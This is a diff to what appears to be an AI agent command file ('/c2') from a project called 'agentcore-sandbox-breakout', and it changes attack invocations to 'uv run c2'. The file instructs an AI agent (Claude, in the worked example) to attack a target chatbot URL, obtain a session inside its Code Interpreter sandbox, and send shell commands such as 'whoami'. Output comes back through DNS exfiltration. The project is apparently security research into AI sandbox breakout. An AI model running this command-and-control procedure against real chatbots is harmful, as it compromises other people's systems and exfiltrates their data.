@@ -78,8 +78,7 @@ To attack a target URL, run from the `attacker-infra` directory:
 ```bash
 cd /Users/kmcquade/code/kmcquade/agentcore-sandbox-breakout/attacker-infra && \
   source set_env_vars.sh && \
-  . ../venv/bin/activate && \
-  python3 src/attack_client.py --target <TARGET_URL> --c2-domain $DOMAIN
+  uv run c2 attack <TARGET_URL> --c2-domain $DOMAIN
 ```
 
 **Parse the session ID** from the output. Look for lines like:
@@ -95,13 +94,12 @@ To send a command to an active session:
 ```bash
 cd /Users/kmcquade/code/kmcquade/agentcore-sandbox-breakout/attacker-infra && \
   source set_env_vars.sh && \
-  . ../venv/bin/activate && \
-  python3 src/attacker_shell.py send "<COMMAND>" --session <SESSION_ID>
+  uv run c2 send "<COMMAND>" --session <SESSION_ID>
 ```
 
 Example:
 ```bash
-python3 src/attacker_shell.py send "whoami" --session sess_abc12345
+uv run c2 send "whoami" --session sess_abc12345
 ```
 
 ### Step 3: Receive Output
@@ -111,8 +109,7 @@ To retrieve output from the session:
 ```bash
 cd /Users/kmcquade/code/kmcquade/agentcore-sandbox-breakout/attacker-infra && \
   source set_env_vars.sh && \
-  . ../venv/bin/activate && \
-  python3 src/attacker_shell.py receive --session <SESSION_ID>
+  uv run c2 receive --session <SESSION_ID>
 ```
 
 **Important:** Output may take 3-10 seconds to arrive via DNS exfiltration. Poll multiple times if needed.
@@ -191,16 +188,16 @@ Code Interpreter sessions timeout after 15 minutes. Need to run a new attack.
 User: /c2 https://victim-chatbot.example.com
 
 Claude executes:
-1. python3 src/attack_client.py --target https://victim-chatbot.example.com --c2-domain $DOMAIN
+1. uv run c2 attack https://victim-chatbot.example.com --c2-domain $DOMAIN
    -> Parses session ID: sess_x7k2m9p1
 
 2. Waits 5 seconds for payload to execute
 
-3. python3 src/attacker_shell.py send "whoami" --session sess_x7k2m9p1
+3. uv run c2 send "whoami" --session sess_x7k2m9p1
 
 4. Waits 3 seconds
 
-5. python3 src/attacker_shell.py receive --session sess_x7k2m9p1
+5. uv run c2 receive --session sess_x7k2m9p1
    -> Output: "genesis1ptools"
 
 6. Reports to user:
